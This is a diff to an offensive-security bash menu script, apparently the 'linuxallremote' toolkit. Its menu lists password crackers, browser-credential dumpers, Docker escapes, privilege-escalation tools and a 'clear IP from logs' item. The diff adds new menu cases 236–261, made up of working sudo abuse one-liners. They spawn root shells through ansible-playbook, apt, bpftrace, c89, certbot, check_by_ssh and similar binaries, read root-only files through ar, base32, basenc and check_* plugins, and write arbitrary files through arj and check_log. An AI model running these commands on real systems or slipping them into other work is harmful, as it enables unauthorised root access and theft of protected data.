@@ -87,14 +87,14 @@ while true; do
 	echo -ne " 231. smaranchand/bucky\n"
 	echo "CRACK"
 	echo -ne " 30. Greenwolf/spray\t\t\t\t\t31. NetSPI/PS_MultiCrack\t\t\t32. TiagoANeves/TDTLinuxPWD\n"
-	echo -ne " 152. mthambipillai/password-cracker\t\t\t153. incredigeek/grond\t\t\t233. hashtopolis/agent-python\n"
+	echo -ne " 152. mthambipillai/password-cracker\t\t\t153. incredigeek/grond\t\t\t\t233. hashtopolis/agent-python\n"
 	echo "DNS"
 	echo -ne " 33. m57/dnsteal\n"
 	echo "DOCKER"
 	echo -ne " 172. Keramas/Blowhole\t\t\t\t\t173. stealthcopter/deepce\t\t\t175. nccgroup/go-pillage-registries_1.0_Linux_i386\n"
-	echo -ne " 176. nccgroup/go-pillage-registries_1.0_Linux_x86_64\t\t\t116. sensepost/dwn\n"
+	echo -ne " 176. nccgroup/go-pillage-registries_1.0_Linux_x86_64\t116. sensepost/dwn\n"
 	echo "DUMPING - EXTRACTING - EXFILTRATING"
-	echo -ne " 50. volatilityfoundation/volatility\t\t140. nyov/python-ffpassdecrypt\t\t\t141. pradeep1288/ffpasscracker/ffpassdecrypt\n"
+	echo -ne " 50. volatilityfoundation/volatility\t\t\t140. nyov/python-ffpassdecrypt\t\t\t141. pradeep1288/ffpasscracker/ffpassdecrypt\n"
 	echo -ne " 149. louisabraham/ffpass\t\t\t\t150. aarsakian/MFTExtractor\t\t\t158. mikeborghi/pywallet\n"
 	echo -ne " 162. TryCatchHCF/PacketWhisper\t\t\t\t180. hasanbulat/tshark/dumpcap (amd64)\t\t207. moonD4rk/HackBrowserData-32bit\n"
 	echo -ne " 208. moonD4rk/HackBrowserData-64bit\n"
@@ -134,9 +134,9 @@ while true; do
 	echo "MITM - SNIFFING"
 	echo -ne " 170. bettercap/bettercap\t\t\t\t179. hasanbulat/tshark (amd64)\n"
 	echo "PRIVESC"
-	echo -ne " 154. TH3xACE/SUDO_KILLER\t\t\t\t109. nongiach/sudo_inject\t\t\t\t226. liamg/traitor-386\n"
+	echo -ne " 154. TH3xACE/SUDO_KILLER\t\t\t\t109. nongiach/sudo_inject\t\t\t226. liamg/traitor-386\n"
 	echo -ne " 224. swisskyrepo/PayloadsAllTheThings/Mathodology_and_Resources/Linux-PrivilegeEscalation\n"
-	echo -ne " 227. liamg/traitor-arm64\t\t\t\t228. liamg/traitor-amd64\t\t\t\t230. b3rito/yodo\n"
+	echo -ne " 227. liamg/traitor-arm64\t\t\t\t228. liamg/traitor-amd64\t\t\t230. b3rito/yodo\n"
 	echo -ne " 234. Liang2580/CVE-2021-33909\n"
 	echo "PROXY - REVPROXY"
 	echo -ne " 211. fatedier/frp_386\t\t\t\t\t212. fatedier/frp_amd64\t\t\t\t213. fatedier/frp_arm\n"
@@ -169,9 +169,9 @@ while true; do
 	echo -ne " 27. PrivEsc with git\t\t\t\t\t28. PrivEsc with apt\t\t\t\t29. PrivEsc with cat\n"
 	echo -ne " 142. clear IP from logs\t\t\t\t143. SOCAT Port Forward\t\t\t\t144. sudo -l\n"
 	echo -ne " 145. ElasticSearch dumping\t\t\t\t146. view lastlog\t\t\t\t147. view auth_log\n"
-	echo -ne " 148. view history\t\t\t\t\t161. Privesc with chroot\t\t\t\t225. Fix limited PATH env\n"
+	echo -ne " 148. view history\t\t\t\t\t161. Privesc with chroot\t\t\t225. Fix limited PATH env\n"
 	echo -ne " 168. search keywords inside files in specific folder\t\t\t\t\t\t\t169. dump keys from memcached\n"
-	echo -ne " 171. escape from Docker method 1\t\t\t174. extract a tar.gz file\n"
+	echo -ne " 171. escape from Docker method 1\t\t\t174. extract a tar.gz file\t\t\t229. insert current path in PATH var\n"
 	echo -ne " 177. use Kubernetes exploit for Local Command Execution\t\t\t\t\t\t178. analyze an executable file with strace and ltrace\n"
 	echo -ne " 182. PrivEsc with sudoedit\t\t\t\t183. PrivEsc by revshell with root priv using systemctl\n"
 	echo -ne " 184. PrivEsc with arp\t\t\t\t\t185. PrivEsc with cut\t\t\t\t186. PrivEsc with base64\n"
@@ -181,9 +181,18 @@ while true; do
 	echo -ne " 197. PrivEsc with find and awk\t\t\t\t198. PrivEsc with less\t\t\t\t199. PrivEsc with more\n"
 	echo -ne " 200. list all bins with perm 400 root\t\t\t201. PrivEsc with nano\t\t\t\t202. PrivEsc with apache2\n"
 	echo -ne " 203. PrivEsc with LP_PRELOAD\t\t\t\t204. get capabilities\t\t\t\t205. PrivEsc with python\n"
-	echo -ne " 210. Decode, unzip and decrypt a file from linuxallremote\t\t\t\t107. PrivEsc with vim method 1\n"
-	echo -ne " 108. PrivEsc with vim method 2\t\t\t\t219. Enum with sysdiagnose\t\t\t\t220. SSH Port Forward\n"
-	echo -ne " 229. insert current path in PATH var\n"
+	echo -ne " 210. Decode, unzip and decrypt a file from linuxallremote\t\t\t\t\t\t107. PrivEsc with vim method 1\n"
+	echo -ne " 108. PrivEsc with vim method 2\t\t\t\t219. Enum with sysdiagnose\t\t\t220. SSH Port Forward\n"
+	echo -ne " 236. PrivEsc with ansible-playbook\t\t\t237. PrivEsc with apt\t\t\t\t238. Read a root's file with ar\n"
+	echo -ne " 239. PrivEsc with aria2c\t\t\t\t240. PrivEsc with arj\t\t\t\t241. PrivEsc with ash\n"
+	echo -ne " 243. Read a root's file with atobm\t\t\t244. Read a root's file with base32\t\t245. Read root's file with basenc\n"
+	echo -ne " 246. PrivEsc with bpftrace\t\t\t\t247. Read a root's file with bridge\t\t248. PrivEsc with bundler\n"
+	echo -ne " 249. PrivEsc with busctl\t\t\t\t250. PrivEsc with busybox\t\t\t251. PrivEsc with byebug\n"
+	echo -ne " 252. PrivEsc with c89\t\t\t\t\t253. PrivEsc with c99\t\t\t\t254. PrivEsc with capsh\n"
+	echo -ne " 255. PrivEsc with certbot\t\t\t\t256. PrivEsc with check_by_ssh\t\t\t257. Read a root's file with check_cups\n"
+	echo -ne " 258. PrivEsc with check_log\t\t\t\t259. Read a root's file with check_memory\t260. Read a root's file with check_raid\n"
+	echo -ne " 261. PrivEsc with check_ssl_cert\t\t\t242. PrivEsc with at\n"
+	
 	echo "WINRM"
 	echo -ne " 132. Alamot/code-snippets/winrm/\n"
 	echo "OTHERS"
@@ -1343,6 +1352,184 @@ while true; do
 			Scarica "armosec/kubescape" "$ENTSSL""$CHC" "kubescape"
 			break
 		done
+	;;
+	"236")
+		TF=$(mktemp)
+		echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
+		sudo ansible-playbook $TF
+	;;
+	"237")
+		echo "Trying method 1"
+		sudo apt-get changelog apt
+		!/bin/sh
+		echo "Trying method 2"
+		TF=$(mktemp)
+		echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' > $TF
+		sudo apt install -c $TF sl
+		echo "Trying method 3"
+		sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh
+	;;
+	"238")
+		echo "Digit a root's file to read"
+		read -e -p "(example, root.txt): " LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			TF=$(mktemp -u)
+			sudo ar r "$TF" "$LFILE"
+			cat "$TF"
+		fi
+	;;
+	"239")
+		echo "Digit a command"
+		read -p "(example, /bin/bash): " COMMAND
+		if [[ "$COMMAND" != "" ]];
+		then
+			if [[ "$TIP" != "" ]];
+			then
+				echo "Digit a target IP"
+				read -p "(example, http://127.0.0.1): " TIP
+			fi
+			TF=$(mktemp)
+			echo "$COMMAND" > $TF
+			chmod +x $TF
+			sudo aria2c --on-download-error=$TF "$TIP"
+		fi
+	;;
+	"240")
+		echo "Digit a file to write"
+		read -p "(example, IdontKnow.txt): " LFILE
+		TF=$(mktemp -d)
+		echo "Digit the path where to write"
+		read -p "(example, /AnyWhere/): " LDIR
+		echo DATA >"$TF/$LFILE"
+		arj a "$TF/a" "$TF/$LFILE"
+		sudo arj e "$TF/a" $LDIR
+	;;
+	"241")
+		sudo ash
+	;;
+	"242")
+		echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | sudo at now; tail -f /dev/null
+	;;
+	"243")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo atobm $LFILE 2>&1 | awk -F "'" '{printf "%s", $2}'
+		fi
+	;;
+	"244")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo base32 "$LFILE" | base32 --decode
+		fi
+	;;
+	"245")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo basenc --base64 $LFILE | basenc -d --base64
+		fi
+	;;
+	"246")
+		sudo bpftrace -c /bin/sh -e 'END {exit()}'
+	;;
+	"247")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo bridge -b "$LFILE"
+		fi
+	;;
+	"248")
+		sudo bundler help
+		!/bin/sh
+	;;
+	"249")
+		sudo busctl --show-machine
+		!/bin/sh
+	;;
+	"250")
+		sudo busybox sh
+	;;
+	"251")
+		sudo install -m =xs $(which byebug) .
+		TF=$(mktemp)
+		echo 'system("/bin/sh")' > $TF
+		./byebug $TF
+		continue
+	;;
+	"252")
+		sudo c89 -wrapper /bin/sh,-s .
+	;;
+	"253")
+		sudo c99 -wrapper /bin/sh,-s .
+	;;
+	"254")
+		sudo capsh --
+	;;
+	"255")
+		TF=$(mktemp -d)
+		sudo certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'
+	;;
+	"256")
+		sudo check_by_ssh -o "ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)" -H localhost -C xx
+	;;
+	"257")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo check_cups --extra-opts=@$LFILE
+		fi
+	;;
+	"258")
+		echo "Digit a file to write"
+		read -p "(example, IdontKnow.txt)" LFILE
+		if [[ "$LFILE" != "" ]];
+		then
+			echo "Digit an input to write"
+			read -p "(example, IdontKnow)" INPUT
+			if [[ "$INPUT" != "" ]];
+			then
+				sudo check_log -F $INPUT -O $LFILE
+			fi
+		fi
+	;;
+	"259")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo check_memory --extra-opts=@$LFILE
+		fi
+	;;
+	"260")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo check_raid --extra-opts=@$LFILE
+		fi
+	;;
+	"261")
+		echo "Digit a command"
+		read -p "(/bin/bash): " COMMAND
+		if [[ "$COMMAND" != "" ]];
+		then
+			OUTPUT=output_file
+			TF=$(mktemp)
+			echo "$COMMAND | tee $OUTPUT" > $TF
+			chmod +x $TF
+			umask 022
+			check_ssl_cert --curl-bin $TF -H example.net
+			cat $OUTPUT
+		fi
 	;;
 	*)
 		echo "error, invalid choice"
